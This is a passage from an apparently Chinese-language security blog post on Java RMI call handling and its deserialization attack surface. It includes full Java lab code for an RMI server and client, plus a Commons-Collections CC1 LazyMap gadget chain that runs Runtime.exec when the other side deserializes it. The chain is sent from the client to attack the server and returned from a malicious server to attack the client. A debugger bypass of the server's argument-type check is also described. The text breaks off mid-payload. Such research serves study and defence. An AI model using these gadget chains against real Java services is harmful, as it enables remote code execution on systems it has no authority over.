alt="image.png"><br>最后一层，真正进行C&#x2F;S交互，客户端调用远程对象方法，并且从Server端获取到返回值。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694534853484-cc954540-310d-4958-a8af-e6d564cfc060.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694535064279-29145086-6172-486b-a9f5-f2b6a5b9cf0d.png" alt="image.png"><br>至此，Client调用远程对象的方法结束。</p><h2 id="服务端接收调用函数请求并返回执行结果"><a href="#服务端接收调用函数请求并返回执行结果" class="headerlink" title="服务端接收调用函数请求并返回执行结果"></a>服务端接收调用函数请求并返回执行结果</h2><p>Server还是断在TCPTransport#handleMessages，DEBUG起Server，正常运行起Client。<br>handleMessages会获取很多请求，像是之前注册中心的lookup，这里多跳几下就能到调用方法的请求了。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694535921686-97620b4d-e2f2-46b9-9049-c0dd3d8026da.png" alt="image.png"><br>调用serviceCall进一步处理网络请求信息，最后调用到UnicastServerRef#dispatch<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694536458461-f50b3cb0-bd8b-437a-a465-67afb64aab04.png" alt="image.png"><br>UnicastServerRef#dispatch，真正处理网络请求，并且返回响应的函数。<br>与调用lookup的不同之处如下<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694536639261-a09d33ea-3a58-49fa-861a-e67bd9f3054c.png" alt="image.png"><br>主要逻辑如下<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694536992646-24e13872-1a81-405c-a5e9-3169a2b9ba3e.png" alt="image.png"><br>至此，服务端完成接受客户端调用（传参）、本地执行函数、返回执行结果这个过程。</p><h1 id="RMI的攻击面"><a href="#RMI的攻击面" class="headerlink" title="RMI的攻击面"></a>RMI的攻击面</h1><h2 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h2><p>攻击原理：Client调用远程对象的方法的时候，会把参数序列化传到Server端，Server端会反序例化传进来的参数<br>这里需要Interface里有参数为非基本类型的函数。<br><strong>详情见：服务端接收调用函数请求并返回执行结果</strong><br>下面是客户端和服务端的代码，推荐客户端和服务端放在两个不同的工程下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="comment">// public void vulFunc(HelloObject o) throws RemoteException;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// @Override</span></span><br><span class="line">    <span class="comment">// public void vulFunc(HelloObject o) throws RemoteException &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="comment">// public void vulFunc(HelloObject o) throws RemoteException;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1.get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// invoke the method of remote object</span></span><br><span class="line">        stub.vulFunc(getCCPayload());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getCCPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC1-LazyMap</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        Class&lt;?&gt; aihClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstuctor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        aihConstuctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih2</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);</span><br><span class="line">        <span class="keyword">return</span> aih2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先运行Server端启动代码，再运行Client端启动代码，成功执行CC1。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694943666872-cff03be1-432c-42b8-a561-96531272d8a9.png" alt="image.png"><br>上面是攻击的是参数为Object类型的漏洞函数，因为基本类型不会走反序列化，是可以成功的。<br>但是要求Server端存在一个参数为Object的函数，攻击面还不够广，于是我们思考，如果Server端的接口里的漏洞函数的参数是自定义的HelloObject类，而服务端接口的参数我们还是传Object，是否能够利用成功？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="comment">// public void vulFunc(Object o) throws RemoteException;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(HelloObject o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// @Override</span></span><br><span class="line">    <span class="comment">// public void vulFunc(Object o) throws RemoteException &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(HelloObject o)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(HelloObject o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1.get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// invoke the method of remote object</span></span><br><span class="line">        stub.vulFunc(getCCPayload());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getCCPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC1-LazyMap</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        Class&lt;?&gt; aihClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstuctor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        aihConstuctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih2</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);</span><br><span class="line">        <span class="keyword">return</span> aih2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先运行Server端启动代码，再运行Client端启动代码，发现报下面的错误：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694944516004-d0135740-81c7-4fb4-a772-1a8c77f5968b.png" alt="image.png"><br>看报错很简单，Server端不支持Object类型参数的函数，那是不是就利用不了了？<br>不卖关子，在这个<a href="https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides%20Exploiting%20RMI%20Services.pdf">PPT</a>中介绍了4种方式，绕过判断实现反序列化，这里我们选最简单的debugger方法。<br>正常启动Server端启动代码，DEBUG启动Client端启动代码，hook点在invokeRemoteMethod<br>右键method，点击Evaluate Expression，会弹出修改method的对话框<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694945020036-b6f51293-2249-4990-87b7-4a36f8cee15d.png" alt="image.png"><br>把method改成参数为HelloObject类型的漏洞函数，点击Evaluate赋值。<br>注意：这里能改是因为Client端的接口既写了参数Object的函数，又写了参数HelloObject的函数</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694945180999-77be06d6-1ccf-43c1-a134-2ab47419d5bf.png" alt="image.png"></p><p>一路consume，也成功执行CC1代码。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694945424011-cec6eebd-4ccd-4ba5-b73a-0da12ecdb47d.png" alt="image.png"></p><h2 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h2><p>攻击原理：客户端调用远程对象的函数，函数在服务端执行完毕以后，函数的返回结果会在服务端序列化，通过网络连接传输，再在客户端反序列化，那么如果恶意的服务端返回一个恶意的函数执行结果，客户端就会受到反序列化攻击。和客户端攻击服务端是同一个流程下的问题。<br><strong>详情见：客户端调用远程对象的方法并获取返回结果</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">vulFunc</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">vulFunc</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">return</span> getCCPayload();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getCCPayload</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//CC1-LazyMap</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span 